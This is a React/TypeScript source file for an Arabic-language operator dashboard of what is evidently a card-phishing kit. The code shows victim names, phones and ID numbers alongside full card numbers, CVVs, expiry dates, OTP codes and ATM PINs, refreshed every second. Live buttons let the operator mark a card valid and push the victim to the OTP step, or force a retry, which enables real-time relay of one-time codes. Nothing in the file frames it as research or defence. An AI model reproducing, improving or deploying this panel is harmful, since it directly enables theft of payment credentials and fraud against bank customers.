import { useEffect, useState, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { useAdminLogout } from "@workspace/api-client-react";
import { getToken, setToken } from "@/lib/auth";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut, RefreshCw, CheckCircle2, XCircle, Clock,
  ShieldCheck, CreditCard, KeyRound, Banknote, Users,
  ChevronDown, ChevronUp, History
} from "lucide-react";

// ─── Types ────────────────────────────────────────────────────────────────────
interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try { return JSON.parse(raw) as Record<string, string>; }
  catch { return {}; }
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}ث`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}د`;
  return `${Math.floor(mins / 60)}س`;
}

function authFetch(path: string, opts: RequestInit = {}) {
  return fetch(path, {
    ...opts,
    headers: {
      Authorization: `Bearer ${getToken() ?? ""}`,
      "Content-Type": "application/json",
      ...(opts.headers ?? {}),
    },
  });
}

// ─── Stat Card ────────────────────────────────────────────────────────────────
function StatCard({
  label, value, icon, color, onClick,
}: { label: string; value: number; icon: React.ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-xl border bg-white p-4 text-right shadow-sm w-full transition-all ${onClick ? "hover:shadow-md cursor-pointer active:scale-95" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-2">
        <div className={`w-9 h-9 rounded-lg flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-2xl font-bold text-gray-800">{value}</span>
      </div>
      <p className="text-xs text-gray-500">{label}</p>
      {onClick && <p className="text-xs text-blue-400 mt-0.5">انقر للتفاصيل ←</p>}
    </button>
  );
}

// ─── Drill-down Modal ─────────────────────────────────────────────────────────
function DrillModal({ type, title, onClose }: { type: string; title: string; onClose: () => void }) {
  const [rows, setRows] = useState<SubmissionRow[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const q = type === "otp" ? "" : `&type=${type}`;
    authFetch(`/api/admin/submissions?limit=200${q}`)
      .then(r => r.json())
      .then((d: { submissions: SubmissionRow[] }) => {
        const filtered = type === "otp"
          ? d.submissions.filter(s => s.type.startsWith("otp"))
          : d.submissions;
        setRows(filtered);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, [type]);

  return (
    <Dialog open onOpenChange={o => !o && onClose()}>
      <DialogContent className="sm:max-w-[620px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>{title} ({rows.length})</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-2">
          {loading ? (
            <div className="py-10 text-center text-gray-400">جاري التحميل...</div>
          ) : rows.length === 0 ? (
            <div className="py-10 text-center text-gray-400">لا توجد بيانات</div>
          ) : (
            <div className="space-y-2 pl-1">
              {rows.map(row => {
                const d = parseData(row.data);
                const skip = new Set(["sessionId", "attempt"]);
                return (
                  <div key={row.id} className="rounded-lg border bg-white p-3 text-sm">
                    <div className="flex justify-between mb-1 text-xs text-gray-400">
                      <span className="font-mono">{row.sessionId.slice(0, 8)}…</span>
                      <span dir="ltr">{formatAgo(row.createdAt)}</span>
                    </div>
                    <dl className="grid grid-cols-2 gap-x-3 gap-y-0.5">
                      {Object.entries(d).filter(([k]) => !skip.has(k)).map(([k, v]) => (
                        <div key={k} className="contents">
                          <dt className="text-gray-400 text-xs">{k}</dt>
                          <dd className="font-mono text-xs break-all">{String(v ?? "")}</dd>
                        </div>
                      ))}
                    </dl>
                  </div>
                );
              })}
            </div>
          )}
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

// ─── Session Box ──────────────────────────────────────────────────────────────
function SessionBox({
  sessionId,
  subs,
  onControl,
}: {
  sessionId: string;
  subs: SubmissionRow[];
  onControl: (sid: string, action: string) => void;
}) {
  const [controlling, setControlling] = useState<string | null>(null);
  const [showOldCards, setShowOldCards] = useState(false);
  const [expanded, setExpanded] = useState(true);

  const initial = subs.find(s => s.type === "initial");
  const initialData = parseData(initial?.data ?? null);
  const name = initialData.ownerName ?? "—";
  const phone = initialData.phone ?? "—";

  const cards = subs.filter(s => s.type === "card");
  const latestCard = cards.length > 0 ? cards[cards.length - 1] : null;
  const oldCards = cards.slice(0, cards.length - 1);
  const latestCardData = parseData(latestCard?.data ?? null);

  const otps = subs.filter(s => s.type.startsWith("otp"));
  const atms = subs.filter(s => s.type === "atm");

  const hasCard = cards.length > 0;
  const hasOtp = otps.length > 0;
  const hasAtm = atms.length > 0;

  const lastActivity = subs[subs.length - 1]?.createdAt ?? subs[0]?.createdAt;

  const status = hasOtp
    ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
    : hasCard
    ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">⏳ ينتظر</Badge>
    : <Badge variant="outline" className="text-gray-400 text-[10px]">بيانات فقط</Badge>;

  const sendControl = async (action: string) => {
    setControlling(action);
    try {
      await authFetch(`/api/admin/control/${sessionId}`, {
        method: "POST",
        body: JSON.stringify({ action }),
      });
      onControl(sessionId, action);
    } finally { setControlling(null); }
  };

  const cardNumber = latestCardData.cardNumber ?? "";
  const formattedCard = cardNumber
    ? cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "—";

  return (
    <div className="rounded-xl border bg-white shadow-sm overflow-hidden">
      {/* ── Header ── */}
      <button
        onClick={() => setExpanded(e => !e)}
        className="w-full flex items-center gap-3 p-3 text-right hover:bg-gray-50 transition-colors"
      >
        <div className="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center shrink-0 text-blue-600 font-bold text-xs">
          {name === "—" ? "?" : name.charAt(0)}
        </div>
        <div className="flex-1 min-w-0 text-right">
          <div className="flex items-center gap-2">
            <span className="font-bold text-gray-800 text-sm truncate">{name}</span>
            {status}
          </div>
          <span className="text-xs text-gray-400" dir="ltr">{phone}</span>
        </div>
        <div className="flex items-center gap-2 shrink-0 text-xs text-gray-400">
          <Clock className="w-3 h-3" />
          {lastActivity ? formatAgo(lastActivity) : ""}
          {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
        </div>
      </button>

      {expanded && (
        <div className="border-t divide-y divide-gray-100">

          {/* ── Latest Card + OTPs tied together ── */}
          {latestCard && (
            <div className="p-3 bg-red-50/50">
              <div className="flex items-center gap-1 text-xs font-bold text-red-700 mb-2">
                <CreditCard className="w-3.5 h-3.5" />
                بيانات البطاقة
                {cards.length > 1 && (
                  <Badge className="bg-red-100 text-red-600 text-[10px] mr-auto">{cards.length} بطاقات</Badge>
                )}
                <span className="text-gray-400 font-normal mr-auto" dir="ltr">{formatAgo(latestCard.createdAt)}</span>
              </div>
              <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs mb-2">
                <span className="text-gray-500">رقم البطاقة</span>
                <span className="font-mono font-bold text-red-700 tracking-wider" dir="ltr">{formattedCard}</span>
                {latestCardData.cardHolder && <>
                  <span className="text-gray-500">الاسم</span>
                  <span className="font-mono">{latestCardData.cardHolder}</span>
                </>}
                {latestCardData.expiry && <>
                  <span className="text-gray-500">الانتهاء</span>
                  <span className="font-mono" dir="ltr">{latestCardData.expiry}</span>
                </>}
                {latestCardData.cvv && <>
                  <span className="text-gray-500">CVV</span>
                  <span className="font-mono" dir="ltr">{latestCardData.cvv}</span>
                </>}
              </div>

              {/* Old cards toggle */}
              {oldCards.length > 0 && (
                <div className="mt-2">
                  <button
                    onClick={() => setShowOldCards(o => !o)}
                    className="flex items-center gap-1 text-xs text-blue-600 hover:underline"
                  >
                    <History className="w-3 h-3" />
                    {showOldCards ? "إخفاء" : "عرض"} البطاقات السابقة ({oldCards.length})
                  </button>
                  {showOldCards && (
                    <div className="mt-2 space-y-2">
                      {oldCards.map(c => {
                        const d = parseData(c.data);
                        const cn = d.cardNumber ?? "";
                        const fullCard = cn ? cn.replace(/(.{4})/g, "$1 ").trim() : "—";
                        return (
                          <div key={c.id} className="bg-white rounded border border-red-100 p-2 text-xs space-y-1">
                            <div className="flex justify-between text-gray-400">
                              <span>بطاقة سابقة</span>
                              <span dir="ltr">{formatAgo(c.createdAt)}</span>
                            </div>
                            <div className="font-mono font-bold text-red-600" dir="ltr">{fullCard}</div>
                            <div className="flex gap-3 text-gray-500">
                              {d.cardHolder && <span>{d.cardHolder}</span>}
                              {d.expiry && <span dir="ltr">{d.expiry}</span>}
                              {d.cvv && <span>CVV: {d.cvv}</span>}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              )}

              {/* OTPs tied to this card */}
              {otps.length > 0 && (
                <div className="mt-3 pt-3 border-t border-red-100">
                  <div className="flex items-center gap-1 text-xs font-bold text-orange-700 mb-2">
                    <KeyRound className="w-3.5 h-3.5" />
                    رموز التحقق — بطاقة {formattedCard}
                  </div>
                  <div className="space-y-1">
                    {otps.map((o, i) => {
                      const d = parseData(o.data);
                      return (
                        <div key={o.id} className="flex items-center justify-between bg-orange-50 rounded px-3 py-1.5 text-xs">
                          <span className="text-orange-600 font-medium">محاولة {i + 1}</span>
                          <span className="font-mono font-bold text-orange-800 text-base tracking-widest" dir="ltr">
                            {d.otpCode ?? "—"}
                          </span>
                          <span className="text-gray-400" dir="ltr">{formatAgo(o.createdAt)}</span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* ATM PINs */}
              {atms.length > 0 && (
                <div className="mt-2 pt-2 border-t border-red-100">
                  <div className="flex items-center gap-1 text-xs font-bold text-yellow-700 mb-1">
                    <Banknote className="w-3.5 h-3.5" />
                    رموز ATM
                  </div>
                  {atms.map(a => {
                    const d = parseData(a.data);
                    return (
                      <div key={a.id} className="flex items-center justify-between bg-yellow-50 rounded px-3 py-1.5 text-xs">
                        <span className="text-yellow-700">الرمز السري</span>
                        <span className="font-mono font-bold text-yellow-800 text-base tracking-widest">{d.atmCode ?? "—"}</span>
                        <span className="text-gray-400" dir="ltr">{formatAgo(a.createdAt)}</span>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          )}

          {/* ── Control buttons — always visible when card exists ── */}
          {hasCard && (
            <div className="p-3 space-y-2 bg-gray-50">
              {hasOtp && (
                <p className="text-xs text-gray-400 text-center mb-1">
                  تم استقبال OTP — يمكنك إرسال أمر إضافي
                </p>
              )}
              <div className="flex flex-col sm:flex-row gap-2">
                <Button
                  size="sm"
                  className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs gap-1"
                  disabled={!!controlling}
                  onClick={() => sendControl("go_otp")}
                >
                  <CheckCircle2 className="w-4 h-4" />
                  {controlling === "go_otp" ? "جاري..." : "✓ صحيحة — حوّل إلى OTP"}
                </Button>
                <Button
                  size="sm"
                  variant="destructive"
                  className="flex-1 text-xs gap-1"
                  disabled={!!controlling}
                  onClick={() => sendControl("card_error")}
                >
                  <XCircle className="w-4 h-4" />
                  {controlling === "card_error" ? "جاري..." : "✗ خاطئة — أعد المحاولة"}
                </Button>
              </div>
            </div>
          )}

          {/* ── Basic info (no card yet) ── */}
          {!hasCard && initial && (
            <div className="p-3 text-xs text-gray-500 space-y-1">
              {initialData.idNumber && <div><span className="text-gray-400">الهوية: </span>{initialData.idNumber}</div>}
              {initialData.formType && <div><span className="text-gray-400">النوع: </span>{initialData.formType}</div>}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Main Dashboard ───────────────────────────────────────────────────────────
export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [sessions, setSessions] = useState<Record<string, SubmissionRow[]>>({});
  const [stats, setStats] = useState<StatsType | null>(null);
  const [drillDown, setDrillDown] = useState<{ type: string; title: string } | null>(null);
  const [controlled, setControlled] = useState<Record<string, string>>({});
  const logout = useAdminLogout();
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    if (!getToken()) { setLocation("/admin"); return; }
  }, [setLocation]);

  const fetchData = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    try {
      const [sessRes, statsRes] = await Promise.all([
        authFetch("/api/admin/submissions?limit=500"),
        authFetch("/api/admin/stats"),
      ]);
      if (sessRes.status === 401) { setToken(null); setLocation("/admin"); return; }
      const sessData = await sessRes.json() as { submissions: SubmissionRow[] };
      const statsData = await statsRes.json() as StatsType;

      // Group by sessionId preserving insertion order
      const map: Record<string, SubmissionRow[]> = {};
      for (const row of sessData.submissions) {
        if (!map[row.sessionId]) map[row.sessionId] = [];
        map[row.sessionId].push(row);
      }
      // Sort each session's subs oldest first
      for (const k of Object.keys(map)) {
        map[k].sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
      }
      // Sort sessions: most recent activity first
      const sorted: Record<string, SubmissionRow[]> = {};
      Object.entries(map)
        .sort(([, a], [, b]) => {
          const aLast = new Date(a[a.length - 1].createdAt).getTime();
          const bLast = new Date(b[b.length - 1].createdAt).getTime();
          return bLast - aLast;
        })
        .forEach(([k, v]) => { sorted[k] = v; });

      setSessions(sorted);
      setStats(statsData);
    } catch { /* ignore */ }
  }, [setLocation]);

  useEffect(() => {
    fetchData();
    intervalRef.current = setInterval(fetchData, 1000);
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, [fetchData]);

  const handleLogout = () => {
    logout.mutate(undefined, {
      onSettled: () => { setToken(null); setLocation("/admin"); },
    });
  };

  const cardCount = stats?.byType.find(t => t.type === "card")?.count ?? 0;
  const otpCount = stats?.byType.filter(t => t.type.startsWith("otp")).reduce((a, b) => a + b.count, 0) ?? 0;
  const atmCount = stats?.byType.find(t => t.type === "atm")?.count ?? 0;
  const sessionCount = Object.keys(sessions).length;

  const pendingCount = Object.values(sessions).filter(subs => {
    const hasCard = subs.some(s => s.type === "card");
    const hasOtp = subs.some(s => s.type.startsWith("otp"));
    return hasCard && !hasOtp;
  }).length;

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      {/* ── Topbar ── */}
      <header className="bg-gray-900 text-white sticky top-0 z-20 shadow-lg">
        <div className="flex items-center justify-between px-4 py-3 max-w-5xl mx-auto">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 text-blue-400" />
            <span className="font-bold text-sm">لوحة التحكم</span>
            {pendingCount > 0 && (
              <span className="bg-orange-500 text-white text-xs rounded-full px-2 py-0.5 animate-pulse">
                {pendingCount} ينتظر
              </span>
            )}
          </div>
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1 text-xs text-green-400">
              <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
              مباشر
            </div>
            <Button variant="ghost" size="sm" onClick={handleLogout}
              className="text-red-400 hover:text-red-300 hover:bg-gray-800 text-xs px-2">
              <LogOut className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-3 sm:px-6 py-4 space-y-4 pb-10">

        {/* ── Stats ── */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          <StatCard label="الجلسات" value={sessionCount}
            icon={<Users className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
          <StatCard label="البطاقات" value={cardCount}
            icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600"
            onClick={cardCount > 0 ? () => setDrillDown({ type: "card", title: "البطاقات المُدخلة" }) : undefined} />
          <StatCard label="رموز OTP" value={otpCount}
            icon={<KeyRound className="w-4 h-4" />} color="bg-orange-100 text-orange-600"
            onClick={otpCount > 0 ? () => setDrillDown({ type: "otp", title: "رموز OTP" }) : undefined} />
          <StatCard label="رموز ATM" value={atmCount}
            icon={<Banknote className="w-4 h-4" />} color="bg-yellow-100 text-yellow-700"
            onClick={atmCount > 0 ? () => setDrillDown({ type: "atm", title: "رموز ATM" }) : undefined} />
        </div>

        {/* ── Sessions ── */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <h2 className="font-bold text-gray-700 text-sm">
              الجلسات ({sessionCount})
            </h2>
            <div className="flex items-center gap-1 text-xs text-gray-400">
              <RefreshCw className="w-3 h-3" />
              تحديث تلقائي كل ثانية
            </div>
          </div>

          {sessionCount === 0 ? (
            <div className="bg-white rounded-xl border p-10 text-center text-gray-400">
              <Users className="w-10 h-10 mx-auto mb-3 opacity-20" />
              <p>لا توجد جلسات بعد</p>
            </div>
          ) : (
            <div className="space-y-3">
              {Object.entries(sessions).map(([sid, subs]) => (
                <SessionBox
                  key={sid}
                  sessionId={sid}
                  subs={subs}
                  onControl={(s, a) => setControlled(p => ({ ...p, [s]: a }))}
                />
              ))}
            </div>
          )}
        </div>

        {/* ── Legend ── */}
        <div className="flex flex-wrap gap-3 text-xs text-gray-400 pt-1">
          <span className="flex items-center gap-1">
            <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px]">⏳ ينتظر</Badge>
            أدخل بطاقة، ينتظر قرارك
          </span>
          <span className="flex items-center gap-1">
            <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
            أكمل رمز التحقق
          </span>
        </div>
      </main>

      {/* ── Drill Modal ── */}
      {drillDown && (
        <DrillModal type={drillDown.type} title={drillDown.title} onClose={() => setDrillDown(null)} />
      )}
    </div>
  );
}
